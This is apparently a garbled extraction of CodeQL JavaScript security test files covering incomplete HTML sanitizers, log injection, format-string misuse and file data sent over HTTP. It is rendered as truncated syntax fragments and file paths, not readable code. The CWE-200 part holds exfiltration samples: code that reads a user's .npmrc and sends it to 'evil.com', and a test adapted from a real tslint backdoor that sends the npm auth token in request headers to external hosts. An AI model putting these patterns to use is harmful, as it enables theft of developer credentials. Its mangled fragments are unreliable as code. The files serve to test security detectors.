"")id.replacereturn id;var REG ... \.\//g;REG_TRA ... .\.\//g(\/)?\.\.\/(\/)?(\/)req.url ... L, "");req.url ... EL, "")req.url.replace(functi ... g);\n});(functi ... eg);\n})functio ... beg);\n}{\n  var ... beg);\n}var beg;for (va ... ak;\n  }i < req.url.lengthreq.url.length{\n    i ... ak;\n  }if (req ...  break;req.url ... === "/"req.url[i] === "."req.url[i]req.url[i + 1]i + 1beg = i + 1;beg = i + 1req.url[i] === "?"if (beg ... g(beg);req.url ... g(beg);req.url ... ng(beg)req.url.substring(functi ...  x;\n});(functi ... n x;\n}){\n  x = ... rn x;\n}x = x.r ... g, "");x = x.r ... /g, "")x.repla ... /g, "")/<scrip ... ript>/g/(\/|\s ... '|")?/g(\/|\s)on\w+=(\'|")?[^"]*(\'|")?(\/|\s)\/|\s(\'|")?(\'|")\'|"[^"]*[^"]<(.)?br(.)?>(.)?(.)<\/?b>b>x = x.r ... i, "");x = x.r ... gi, "")x.repla ... gi, "")/<(ul|o ... ol)>/gi<(ul|ol)><\/(ul|ol)>(ul|ol)ul|olulol><<li><\/li><li><li>x = x.r ... m, "");x = x.r ... gm, "")x.repla ... gm, "")<!--(.*?)-->(.*?)-->x = x.r ... /, "");x = x.r ... +/, "")x.repla ... +/, "")\sng-[a-z-]+ng-[a-z-]+[a-z-]x = x.r ...  "\n");x = x.r ... , "\n")x.repla ... , "\n")/(<!--\ ... ]-->)/g(<!--\[CDATA\[|\]\]-->)<!--\[CDATA\[|\]\]--><!--\[CDATA\[CDATA\]\]--><script.+desktop\-only.+<\/script>desktop<script async.+?<\/script><script async.+?/<!--[\ ... ?\?>/gi<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?><!--[\s\S]*?-->[\s\S]*?<\?(?:php)?[\s\S]*?\?>(?:php)?(?:php)/\x2E\x ... E\x2F/g\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2F<script.*>.*<\/script>^(\.\.\/?)+(\.\.\/?)+(\.\.\/?)\.\.\/?x = x.r ... ;\n  });x = x.r ... ";\n  })x.repla ... ";\n  })functio ... "";\n  }{\n    r ... "";\n  }return  ... 0 : "";unknown ? $0 : ""/<\/?([ ... >]*>/gi<\/?([a-z][a-z0-9]*)\b[^>]*>([a-z][a-z0-9]*)[a-z][a-z0-9]*[a-z0-9]*[a-z0-9]\/\.\.<script(.*?)>([\s\S]*?)<\/script>([\s\S]*?)/<(scri ... \s*>/gi<(script|del)(?=[\s>])[\w\W]*?<\/\1\s*>(script|del)script|deldel(?=[\s>])[\s>][\w\W]*?[\w\W]\WW/\<scri ... ipt\>/g\<script[\s\S]*?\>[\s\S]*?\<\/script\>/<(scri ... le)>/gm<(script|style|title)[^<]+<\/(script|style|title)>(script|style|title)script|style|title[^<]+<script[^>]*>([\s\S]*?)<\/script><script[\s\S]*?<\/script> ?<!-- ? ?/requir ... n'\);/grequire\('\.\.\/common'\);common'\.\.\/\.\.\/lib\/libx.indexOf("."){\n    x ...  OK\n  }x = x\n  ... /, "");x = x\n  ... //, "")x\n      ... //, "")x\n      ... replacex\n      ... /, "/")x\n      .replace^\.\/\/\.\/[^\/]*\/\.\.\/[^\/]*[^\/]([^.\s]+\.)+([^.\s]+\.)[^.\s]+\.[^.\s]+[^.\s]/<!\-\- ... \-\->/g<!\-\-DEVEL[\d\D]*?DEVEL\-\-><!DEVEL[\d\D]*?[\d\D]x\n    . ... //, "")x\n    . ... replacex\n    . ... /, "/")x\n    .replace{\n\tcont ... OT OK\n}<script.*\/script>/<(scri ... ipt>/gi<(script).*\/script>(script)/.+<(sc ... ipt>/gi.+<(script).*\/script>/.*<(sc ... ipt>/gi.*<(script).*\/script>content ... || ' ';content ...  || ' 'content ... /g, '')/<[a-zA ... n)*?>/g<[a-zA-Z\/](.|\n)*?>[a-zA-Z\/](.|\n)*?(.|\n).|\n/<(scri ... deo)>/g<(script|iframe|video)[\s\S]*?<\/(script|iframe|video)>(script|iframe|video)script|iframe|video<(script|iframe|video)(.|\s)*?\/(script|iframe|video)>(.|\s)*?(.|\s).|\s<[^<]*>/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-116/IncompleteSanitization/tst.js NB: escapes backslashes// NB:  ... slashes NOT OK: too common as a bad HTML sanitizer// NOT  ... nitizer NOT OK: should have used a string literal if a single replacement was intended// NOT  ... ntended probably OK, but still flagged// prob ... flagged motivation for whitelist// moti ... itelist the query doesn't currently check whether untrusted input flows into the// the  ... nto the sanitiser, but we add these calls anyway to make the tests more realistic// sani ... alistic OK - single quotes or double quotes both work// OK - ... th work ... /* ... */ OK (probably)// OK (probably) OK (and not recognized due to the ternary)// OK ( ... ernary) OK (but probably unsafe)// OK ( ... unsafe) OK (maybe, since the attribute name is unknown)// OK ( ... nknown) NOT OK - but not flagged since the `x` replace chain is extended belowbad1bad2/'/bad3bad4"\\$&"bad5/['"]/gbad6/(['"])/g"\\$1"bad7/('|")/gbad8bad9"\\\""bad10"%2F"bad11"%25""%"bad12bad13bad14bad15bad16bad17good1good2good3"@user""id10t"good4"\\d+"good5good6/[\\]/g/[\"]/g'\\"'good7good8/\W/g'\\$&'good9/[^\w\s]/ggood10flowifyComments''good11"%d""42"good12'{''}''\\[''\\]''\\{''\\}'/{//}/newlines"which emacs""p"bad18"/../"typicalBadHtmlSanitizers/[<>]/g/[<>&]/g/[<>"]/g'&gt''&#34;'RE/[<>'"&]/g/&(?!#?\w+;)/g'&apos;'/[\\/:\*\?"<>\|]/g'_'"&gt;"/[\#\%4\/\-\~\>8\_\@0\!\&3\[651d\=e7fA2D\(aFBb]/g/[^a-z]/g/[^abc]/g/[ -~]/gincompleteHtmlAttributeSanitization'="'/[<>&"]/g/[&"]/g/[<>&']/g"='"'onFunkyEvent="''<div noise onFunkyEvent="''<div noise monday="''monday="'multiStepSanitizationescapeHTMLattr_strmoreIncompleteHtmlAttributeSanitization'<a'noise'onclick="javascript:document.foo.bar(\'''\'); return false;">'/[^\w ]+/g/^,|,$/g/^;|;$/garr2'onclick="'escapeAmpersandescapeQuotesincompleteHtmlAttributeSanitization2'=\''/[&<>]/g/[&<>"]/gincompleteComplexSanitizers/[&<>"]/gm"<""&lt;"">"return  ... ", "");s.replace("'", "")return  ... /, "");s.replace(/'/, "")return  ... "\\'");return  ... \\$&");s.repla ... "\\$&")\$&['"]return  ... \\$1");s.repla ... "\\$1")(['"])\$1('|")'|"return  ... ', '');s.replace('|', '')return  ... \\\"");s.repla ... "\\\"")return  ... "%2F");s.repla ...  "%2F")%2Freturn  ... , "%");s.repla ... ", "%")return  ... `, "");s.replace(`'`, "")`'`return  ... ", ``);s.replace("'", ``)``return  ... `, ``);s.replace(`'`, ``)s.repla ... "", "")"'" + ""return  ...  + "");s.repla ... " + "")"" + ""{\n  whi ... rn s;\n}while ( ... ", "");s.indexOf("'") > 0s.indexOf("'")s.indexOfs = s.r ... ", "");s = s.r ... '", "")while ( ... /, "");s = s.r ... /, "");s = s.r ... '/, "")return  ... d10t");s.repla ... id10t")@userid10treturn  ... \\d+");s.repla ... "\\d+")return  ... '\\"');s.repla ...  '\\"')s.repla ... '\\\\')[\\][\"]{\n  s = ... // OK\n}s = s.r ... \\\\');s = s.r ... '\\\\')return  ... \\$&');s.repla ... '\\$&')[^\w\s]functio ...  "'";\n}{\n  s = ...  "'";\n}s = JSO ... ify(s);s = JSO ... gify(s)JSON.stringify(s)s = s.slice(1, -1);s = s.slice(1, -1)s.slice(1, -1)s.slices = s.r ... , '"');s = s.r ... g, '"')s.repla ... g, '"')return  ...  + "'";"'" + s + "'""'" + sreturn  ...  '\u1f4a9\udca9');s.repla ... , '\u1f4a9\udca9')'\u1f4a9\udca9'functio ... 42");\n}{\n  ret ... 42");\n}return  ...  "42");s.repla ... , "42")%d42functio ... agged\n}{\n\ts.re ... agged\n}s.repla ... ', '');s.repla ... ]', '')s.replace('[', '')s.repla ... )', '')s.replace('(', '')s.repla ... }', '')s.replace('{', '')s.repla ... >', '')s.replace('<', '')s.repla ... '\\]');s.repla ...  '\\]')s.repla ...  '\\[')s.repla ... '\\}');s.repla ...  '\\}')s.repla ...  '\\{')s = s.r ... ', '');s = s.r ... [', '')s = s.r ... ]', '')s.replace(']', '')s.repla ... /, '');s.repla ... }/, '')s.replace(/{/, '')unexpected characters.repla ... [', ''){\n\t// m ... OT OK\n}require ... ", "");require ... n", "")require ... replacerequire ... tring()require ... oStringrequire ... emacs")require ... xecSyncwhich emacsx.repla ... (x, y);x.repla ... e(x, y)x.repla ... replacex.replace("\n", "")x.repla ... ", "");x.repla ... n", "")x.replace(x, y)app.get ... d);\n});app.get ... ed);\n}){\n  let ... ted);\n}let unt ... m("p");untrust ... am("p")req.param("p")bad1(untrusted);bad1(untrusted)bad2(untrusted);bad2(untrusted)bad3(untrusted);bad3(untrusted)bad4(untrusted);bad4(untrusted)bad5(untrusted);bad5(untrusted)bad6(untrusted);bad6(untrusted)bad7(untrusted);bad7(untrusted)bad8(untrusted);bad8(untrusted)bad9(untrusted);bad9(untrusted)bad10(untrusted);bad10(untrusted)bad11(untrusted);bad11(untrusted)bad12(untrusted);bad12(untrusted)bad13(untrusted);bad13(untrusted)bad14(untrusted);bad14(untrusted)bad15(untrusted);bad15(untrusted)bad16(untrusted);bad16(untrusted)bad17(untrusted);bad17(untrusted)good1(untrusted);good1(untrusted)good2(untrusted);good2(untrusted)good3(untrusted);good3(untrusted)good4(untrusted);good4(untrusted)good5(untrusted);good5(untrusted)good6(untrusted);good6(untrusted)good7(untrusted);good7(untrusted)good8(untrusted);good8(untrusted)good9(untrusted);good9(untrusted)good10(untrusted);good10(untrusted)flowify ... usted);flowify ... rusted)good11(untrusted);good11(untrusted)good12(untrusted);good12(untrusted)var indirect = /'/;indirect = /'/return  ... t, "");s.repla ... ct, ""){\n\ts.re ... // OK\n}s.repla ... "', '')s.replace('"', '')s.repla ... ", "");s.repla ... '", "")p.repla ... /", "")p.replace/../typical ... itizers{\n\ts(). ... // OK\n}s().rep ... /g,'');s().rep ... ]/g,'')s().replaces()s().rep ... g, '');s().rep ... /g, '')[<>&][<>"]s().rep ... replacevar s = ... g, '');s = s() ... /g, '')s = s.r ... g, '');s = s.r ... /g, '')s.replace(/>/g, '')s().rep ... #34;');s().rep ... &#34;')s().rep ... &amp;')s().rep ...  '&gt')s().rep ... '&lt;')&gt&#34;s().rep ... #39;');s().rep ... &#39;')s().rep ...  */ });s().rep ... . */ })functio ... .. */ }{/* ... */ }s().rep ... amp;');s().rep ... quot;')s().rep ... '&gt;')s().rep ... pos;');s().rep ... apos;')!encode ...  : /&/g!encode&(?!#?\w+;)(?!#?\w+;)#?\w+;#?[\\/:\*\?"<>\|]s().rep ... g,'_');s().rep ... /g,'_')s().rep ... &gt;");s().rep ... "&gt;")s().rep ... g, "");s().rep ... /g, "")/[\#\%4 ... aFBb]/g[\#\%4\/\-\~\>8\_\@0\!\&3\[651d\=e7fA2D\(aFBb]B[^a-z][^abc][ -~] -~incompl ... ization{\n\t'="' ... // OK\n}'="' +  ...  + '"';'="' +  ... ) + '"''="' +  ... ]/g,'')'="' +  ... /g, '')[<>&"][&"][<>&']"='" +  ...  + "'";"='" +  ... ) + "'""='" +  ... ]/g,'')=''onFunk ...  + '"';'onFunk ... ) + '"''onFunk ... /g, '')onFunkyEvent="'<div n ...  + '"';'<div n ... ) + '"''<div n ... /g, '')'<div n ... vent="'<div noise onFunkyEvent="'<div n ... nday="'<div noise monday="'monday ...  + '"';'monday ... ) + '"''monday ... /g, '')monday="functio ...  '>';\n}multiSt ... ization{\n\tfunc ...  '>';\n}functio ... ;');\n\t}{\n\t\tret ... ;');\n\t}value.r ... '&gt;')value.r ... replacevalue.r ... '&lt;')value.r ... &amp;')value.replace{\n\t\tret ... / OK\n\t}return  ...  + '"';' ' + a ... ) + '"'' ' + a ... quot;')' ' + a.name + '="'' ' + a.namea.nameescapeH ... quot;')escapeH ... replaceescapeHTML(a.value)a.valueresult  ...  + '>';result  ... ) + '>''<' + t ... ) + '>''<' + t ... oin('')'<' + tag(node)tag(node)[].map. ... oin('')[].map. ... r).join[].map. ... tr_str)[].map.call[].mapmoreInc ... ization{\n\t'<a' ... // OK\n}'<a' +  ... se;">';'<a' +  ... lse;">''<a' +  ... /g, '')'<a' +  ... bar(\'''<a' + noise<a'onclic ... bar(\''onclick="javascript:document.foo.bar(''\'); r ... lse;">''); return false;">[^\w ]+[^\w ]'="' +  ... /g,''))encodeU ... /g,''))var arr ...  , '');arr = s ... g , '')s().val ... g , '')s().val ... replaces().val().trim()s().val().trims().val()s().val^,|,$^,,$^;|;$^;;$'="' + arr.join(" ")arr.join(" ")arr.joinvar arr ... g , '')arr2 =  ... g , '')arr2 =  ... /g,"");arr2 =  ... "/g,"")arr2.re ... "/g,"")arr2.replace'="' +  ... in(" ")arr2.join(" ")arr2.joinvar x;x = x.r ... amp;');x = x.r ... &amp;')x.repla ... &amp;')x = x.r ... &gt;');x = x.r ... '&gt;')x.repla ... '&gt;')x.repla ... '&lt;')'onclic ...  + '"';'onclic ... x + '"''onclick="' + xonclick="x = x.r ... uot;');x = x.r ... quot;')x.repla ... quot;')var y;if (esc ... ;');\n\t}{\n\t\ty = ... ;');\n\t}y = y.r ... amp;');y = y.r ... &amp;')y.repla ... &amp;')y.replacey = y.r ... &gt;');y = y.r ... '&gt;')y.repla ... '&gt;')y.repla ... replacey.repla ... '&lt;')'onclic ... y + '"''onclick="' + yy = y.r ... uot;');y = y.r ... quot;')y.repla ... quot;')incompl ... zation2{\n\t'=\' ... // OK\n}'=\'' + ... + '\'';'=\'' + ...  + '\'''=\'' + ... ]/g,'')[&<>][&<>"]'=\'' + ... /g, '')functio ...  '"';\n}incompl ... itizers{\n\t'=\' ...  '"';\n}'=\'' + ... ;";\n\t})s().rep ... ;";\n\t})functio ... t;";\n\t}{ // NO ... t;";\n\t}if (str ... &amp;";str === "&"return "&amp;";if (str ... "&lt;";str === "<"return "&lt;";if (str ... "&gt;";str === ">"return "&gt;";if (str ... quot;";str === "\""return "&quot;";'="' +  ... ;";\n\t}){ // OK ... t;";\n\t}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-117/logInjectionBad.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-117 do something// do something'127.0.0.1'3000check_username is not validmy_loggeranother_logger[INFO] User: [INFO] User: %s'[INFO] User:'[ERROR] Error: "ansiColors'ansi-colors''colors'wrapAnsi'wrap-ansi'underline"colorette"highlight'cli-highlight'clc"cli-color"sliceAnsi'slice-ansi'kleur'kleur'chalk'chalk'stripAnsi'strip-ansi'server2yellow'sql'ignoreIllegalsbgWhite30bgBlueprettyjson'prettyjson'server3pino'pino'server4fastify'fastify'loggerreply'world''Hello World\n'hapiHapi'hapi''GET'const h ... 0.0.1';hostnam ... .0.0.1'127.0.0.1127const port = 3000;port = 3000const u ... 'url');const c ... thing\n}check_u ... thing\n}(userna ... thing\n}{\n    i ... thing\n}if (use ... valid`;username != 'name'throw ` ... valid`;`${user ...  valid`const m ... e.log\n}my_logg ... e.log\n}{\n    l ... e.log\n}log: console.logconst a ... ole.loganother ... ole.logconst s ...   }\n});server  ...    }\n})http.cr ...    }\n}){\n    l ...     }\n}let q = ...  true);q = url ... , true)let use ... ername;usernam ... sernameq.query.usernameq.queryconsole ... ame}`);console ... name}`)console.info`[INFO] ... rname}`console ... rname);console ... ername)`[INFO] User: %s`my_logg ... rname);my_logg ... ername)my_logger.log[INFO] User:[INFO] User:another ... rname);another ... ername)try {\n  ... K\n    }check_u ... ername)catch ( ... K\n    }console ... or}"`);console ... ror}"`)console.error`[ERROR ... rror}"`const a ... lors');ansiCol ... olors')require ... olors')ansi-colorsconst c ... lors');colors  ... olors')require('colors')import  ... -ansi';wrap-ansiimport  ... orette"coloretteconst h ... hlight;highlig ... ghlightrequire ... ghlightrequire ... light')cli-highlightvar clc ... olor");clc = r ... color")require("cli-color")cli-colorslice-ansiimport  ... kleur';const c ... halk');chalk = ... chalk')require('chalk')strip-ansiconst s ...  OK\n});server2 ... T OK\n})console ... name));console ... rname))ansiCol ... ername)ansiCol ... derlineansiColors.yellowcolors. ... ername)colors.red.underlinecolors.redconsole ... , 20));console ... ), 20))wrapAns ... e), 20)console ... me))));console ... ame))))underli ... name)))bold(blue(username))blue(username)console ... rue}));console ... true}))highlig ...  true}){langua ... : true}language: 'sql'ignoreIllegals: trueclc.red ... ername)clc.red ... derlineclc.red.bgWhiteclc.redconsole ... , 30));console ... 0, 30))sliceAn ... 20, 30)kleur.b ... ername)kleur.b ... derlinekleur.blue().bold()kleur.blue().boldkleur.blue()kleur.bluechalk.u ... ername)chalk.u ... .bgBluechalk.underlineconsole ... ame)));console ... name)))stripAn ... rname))var pre ... json');prettyj ... yjson')require ... yjson')const s ... OK\n\n});server3 ...  OK\n\n})http.cr ...  OK\n\n})(req, r ... T OK\n\n}{\n    l ... T OK\n\n}prettyj ... ername)prettyjson.renderconst p ... ino')()pino =  ... ino')()require('pino')()require('pino')server4 ...    }\n})pino.info(username);pino.info(username)pino.infoconst f ...     });fastify ...      })require ...      })require('fastify')logger: truefastify ...     });fastify.getasync ( ...       }request ... rname);request ... ername)request.log.inforequest.logreturn  ... orld' }{ hello: 'world' }hello: 'world'worldapp.get ...     });app.get ...      })(req, r ...       }req.log ... rname);req.log ... ername)req.log.inforeq.logres.sen ... ld' });res.sen ... rld' })server  ...      })http.cr ...      })res.end ... ld\n');res.end ... rld\n')Hello World
server.listen(3000);server.listen(3000)const H ... hapi');Hapi =  ... 'hapi')require('hapi')const s ... rver();server  ... erver()new Hapi.Server()Hapi.Serverserver. ... 000 });server. ... 3000 })server.connection{ port: 3000 }port: 3000server. ...     });server. ...      })server.routemethod: 'GET'path: '/'handler ...       }(reques ...       }request.logger.inforequest.loggerreply({ ... ld' });reply({ ... rld' })server.start();server.start()server.start/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-117/logInjectionGood.js GOOD: remove `\n` line from user controlled input before logging// GOOD ... logging/\n|\r/gconst c ... lid`;\n}check_u ... lid`;\n}(userna ... lid`;\n}{\n    i ... lid`;\n}const l ... e.log\n}logger  ... e.log\n}let use ... g, "");usernam ... /g, "")q.query ... /g, "")q.query ... replace\n|\rlogger. ... rname);logger. ... ername)logger.logtry {\n  ... ;\n    }catch ( ... ;\n    }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-134/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-134formatWithOptions'printf'write_stream'printj'sprintfvsprintf'format-util''string-template''string-template/compile'"sprintf-js"{\n  uti ... OT OK\n}util.fo ... , arg);util.fo ... t, arg)req.query.formatrequire ... , arg);require ... t, arg)require ... .formatconsole ... , arg);console ... t, arg)util.lo ... , arg);util.lo ... t, arg)util.fo ... Optionsrequire('printf')require ... sprintfrequire('printj')printjrequire ... -util')format-utilrequire ... plate')string-templaterequire ... mpile')'string ... ompile'string-template/compileutil.fo ... ormat);util.fo ... format)console.debugconsole.warnconsole.traceconsole ... ormat);console ... format)console.assertrequire ... tf-js")sprintf-jsrequire ...  args);require ... , args)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/FileAccessToHttp.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200".npmrc""evil.com""/upload"Referervar fs  ... ttps");var con ... utf8");content ... "utf8")fs.read ... "utf8").npmrcnpmrchttps.g ... > { });https.g ... => { }){\n  hos ... ent }\n}hostname: "evil.com"evil.compath: "/upload"/uploadmethod: "GET"headers ... ntent }{ Referer: content }Referer: content() => { }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/bufferRead.js adopted from https://stackoverflow.com/questions/36771266/what-is-the-use-of-fd-file-descriptor-in-node-js// adop ... node-js BAD: write data from file to request body// BAD: ... st body"foo.txt""r"postData'www.google.com'80'/upload''POST''application/x-www-form-urlencoded'var fil ... o.txt";fileName = "foo.txt"fs.exis ...   }\n});fs.exis ... \n  }\n}){\n   if ... ;\n  }\n}if (exi ... });\n  }{\n    f ... });\n  }fs.stat ...     });fs.stat ... \n    })fs.open ...     });fs.open ...      })var buf ... .size);buffer  ... s.size)new Buf ... s.size)stats.sizefs.read ...      })buffer.length{\n\n     ...       }var pos ... sRead);postDat ... esRead)buffer. ... esRead)buffer.toStringconst o ...      };options ...       }www.google.comgoogleport: 80path: '/upload'method: 'POST''Conten ... ncoded''applic ... ncoded'application/x-www-form-urlencoded'Conten ... stData)Buffer. ... stData)req = h ...      })http.re ...      })(res) = ...       }res.set ... 'utf8')res.setEncodingreq.write(postData);req.write(postData)req.writereq.end();req.end()req.endfs.close(fd);fs.close(fd)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/express-send-file.js OK (for now) since this is a server-side response// OK ( ... esponse'/getFooFile'var exp ... ress();app.get ... nse\n});app.get ... onse\n})/getFooFilefunctio ... ponse\n}{\n    r ... ponse\n}res.sendFile("foo");res.sendFile("foo")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/fs-read-externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/googlecompiler.js adopted from https://stackoverflow.com/questions/6158933/how-to-make-an-http-post-request-in-node-js Build the post string from an object// Buil ...  object BAD: passing data from file to the request json body// BAD: ... on body An object of options to indicate where to post to// An o ... post to Set up the request// Set  ... request BAD: post the data from file to request body This is an async file read// This ... le read If this were just a small part of the application, you would// If t ... u would want to handle this differently, maybe throwing an exception// want ... ception for the caller to handle. Since the file is absolutely essential// for  ... sential to the program's functionality, we're going to exit with a fatal// to t ... a fatal error instead.// error instead. Make sure there's data before we post it// Make ... post it'querystring'PostCodecodestringpost_data'compilation_level''ADVANCED_OPTIMIZATIONS''output_format''json''output_info''compiled_code''warning_level''QUIET''js_code'post_options'closure-compiler.appspot.com''80''/compile'post_req'Response: ''LinkedList.js''utf-8'"FATAL An error occurred trying to read in the file: ""No data to post"var que ... ring');queryst ... tring')require ... tring')functio ... d();\n\n}{\n  //  ... d();\n\n}var pos ... y\n  });post_da ... dy\n  })queryst ... dy\n  }){\n      ... ody\n  }'compil ... ATIONS'compilation_level'ADVANC ... ATIONS'ADVANCED_OPTIMIZATIONS'output ...  'json''output ... d_code'output_infocompiled_code'warnin ... 'QUIET'warning_levelQUIET'js_cod ... estringjs_codevar pos ...  }\n  };post_op ...   }\n  }{\n      ...   }\n  }host: ' ... ot.com''closur ... ot.com'closure-compiler.appspot.comclosure-compilerappspotport: '80'path: '/compile'/compile'Conten ... t_data)Buffer. ... t_data)var pos ... ;\n  });post_re ... );\n  })http.re ... );\n  }){\n      ... });\n  }res.on( ...     });res.on( ...      })console ... chunk);console ...  chunk)'Response: ' + chunkResponse: post_re ... _data);post_re ... t_data)post_req.writepost_req.end();post_req.end()post_req.endfs.read ...   }\n});fs.read ... \n  }\n})LinkedList.jsLinkedListutf-8if (err ... 2);\n  }{\n    / ... 2);\n  }console ... + err);console ...  + err)"FATAL  ... " + err"FATAL  ... file: "FATAL An error occurred trying to read in the file: process.exit(-2);process.exit(-2)-2if(data ... 1);\n  }{\n    P ... a);\n  }PostCode(data);PostCode(data){\n    c ... 1);\n  }console ... post");console ...  post")No data to post/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/lib/package.json/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/lib{\n    " ...     }\n}"3.2.0"3.2.0/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/lib/tst.js'basedir'rootDir'/monthly'app.use ... name));app.use ... rname))express ... irname)express.staticconst r ... irname;rootDir = __dirnameapp.use ... tDir));app.use ... otDir))express ... ootDir)app.use ...  '/'));app.use ... + '/'))/monthlyexpress ...  + '/')__dirname + '/'/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/private-file-exposure.js Not good. // Not good.  Good// Good GOOD, because there is no package.json in the same folder.// GOOD ... folder. Bad documentation example// Bad  ... example Good documentation example// Good ... example'./node_modules/angular''/angular''node_modules/angular''/animate''node_modules/angular-animate''/js''/node_modules/angular''/router''/node_modules/angular-route/''/node_modules''../node_modules'"./node_modules"'/angular/'"/node_modules"nodeDir'./node_modules/jquery/dist''./node_modules/bootstrap/dist''/node_modules/html5sortable/dist''/css''/favicon.ico'"/static""/static/js"'/docs/api''docs/api''/js/''node_modules/bootstrap/dist/js''/css/''node_modules/font-awesome/css'"connect"'serve-static''/home'"os"'/root'bad"bootstrap"serveHandler"serve-handler""./node_modules/angular"app.use ... lar'));app.use ... ular'))express ... gular')'./node ... ngular'./node_modules/angular/node_modules/angular/angular'node_m ... ngular'node_modules/angularapp.use ... ate'));app.use ... mate'))/animateexpress ... imate')'node_m ... nimate'node_modules/angular-animate/js__dirna ... ngular''/node_ ... ngular'app.use ... te/'));app.use ... ute/'))express ... oute/')__dirna ... route/''/node_ ... route/'/node_modules/angular-route/app.use ... es')));app.use ... les')))/node_modulesexpress ... ules'))path.re ... dules')../node_modulesapp.use ... './'));app.use ... ('./'))express.static('./')app.use ... ar/'));app.use ... lar/'))express ... ular/')"./node ... gular/'./node_modules/angular/app.use ... r/')));app.use ... ar/')))express ... lar/'))path.jo ... ular/')app.use ... es")));app.use ... les")))express ... ules"))path.jo ... dules")path.jo ... gular/'const n ... ules");nodeDir ... dules")rootDir ... odules"nodeDir ... gular/'app.use ... ist'));app.use ... dist'))express ... /dist')'./node ... y/dist'./node_modules/jquery/dist/node_modules/jquery/dist'./node ... p/dist'./node_modules/bootstrap/dist/node_modules/bootstrap/dist__dirna ... e/dist''/node_ ... e/dist'/node_modules/html5sortable/distapp.use ... css'));app.use ... /css'))/cssexpress ... '/css')__dirname + '/css'app.use ... ico'));app.use ... .ico'))/favicon.ico/faviconicoexpress ... n.ico')__dirna ... on.ico'app.use ... tic"));app.use ... atic"))express ... tatic")__dirna ... static"/staticapp.use ... /js"));app.use ... c/js"))express ... ic/js")__dirna ... tic/js"/static/jsapp.use ... api'));app.use ... /api'))/docs/apiexpress ... s/api')docs/apiapp.use ... t/js'))/js/express ... st/js')'node_m ... ist/js'node_modules/bootstrap/dist/js/css/express ... e/css')'node_m ... me/css'node_modules/font-awesome/cssconst c ... nect");connect ... nnect")require("connect")connect ... ular/')connect.staticrequire ... ular/')require ... tatic')serve-staticapp.use ... ir()));app.use ... dir()))/homerequire ... edir())require ... medir()require ... homedirrequire("os")app.use ... ("/"));app.use ... )("/"))/rootrequire ... ')("/")bootstrapconst s ... dler");serveHa ... ndler")require ... ndler")serve-handlerconst h ... http");http.cr ... / OK\n})(reques ... // OK\n}serveHa ... lar"});serveHa ... ular"}){public ... gular"}public: ... ngular""./node ... ngular"serveHa ... ponse);serveHa ... sponse)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/readFileSync.js"input.txt"let dat ... .txt");data =  ... t.txt")fs.read ... t.txt")input.txttry {\n  ... (e) {\n}{\n  let ... nd();\n}let s = ... ring();s = data.toString()data.toString()data.toString'Conten ... ngth(s)Buffer.byteLength(s)functio ... ');\n  }{\n      ... ');\n  }post_req.write(s);post_req.write(s)catch (e) {\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/readStreamRead.js'readable'var rea ... eName);readabl ... leName)readabl ...     });readabl ...      })readable.onlet chu ... read();chunk = ... .read()readable.read()readable.readreq.write(chunk);req.write(chunk)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/request.js adopted from https://stackoverflow.com/questions/9577611/http-get-request-in-node-js-express// adop ... express BAD: passing data from file to the request body source// source'request'PostJSONjsonDataPostXMLxmlData"http://example.com/myxml"'MyFile.json''MyFile.xml'var req ... uest');request ... quest')require('request'){\n  req ...   });\n}request ... ;\n  });request ... );\n  }){jsonData}functio ... e);\n  }{ // BA ... e);\n  }console ... ponse);console ... sponse){\n\n  re ...   });\n}{\n    u ... ody\n  }url: "h ... /myxml""http:/ ... /myxml"http://example.com/myxmlhttp://examplecom/myxmlheaders ... ,\n    }"conten ... on/xml"body: xmlData{\n    c ... e);\n  }MyFile.jsonMyFile{ // so ... ;\n  }\n}{\n    c ... 2);\n  }PostJSON(data);PostJSON(data)MyFile.xml{       ... ;\n  }\n}PostXML(data);PostXML(data)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/sentAsHeaders.js adopted from actual tslint backdoor payload, see https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e// adop ... 9826b3eBAD: passing stolen token in a  header//BAD:  ...  header"nofile"HOMEUSERPROFILE"//registry.npmjs.org/:_authToken="https1"sstatic1.histats.com""/0.gif?4103075&101""http://1.a/""c.statcounter.com""/11760461/0/7b5b9d71/1/""http://2.b/"try { \n ... (e) {\n}{ \n  va ... ;\n  }\n}var pat ... ofile";content = "nofile"nofilevar npm ... pmrc");npmrc = ... npmrc")path.jo ... npmrc")process ... PROFILEprocess.env.HOMEif (fs. ... });\n  }fs.existsSync(npmrc)content ... f8" });content ... tf8" })fs.read ... tf8" }){ encoding: "utf8" }encoding: "utf8"fs.open ... \n    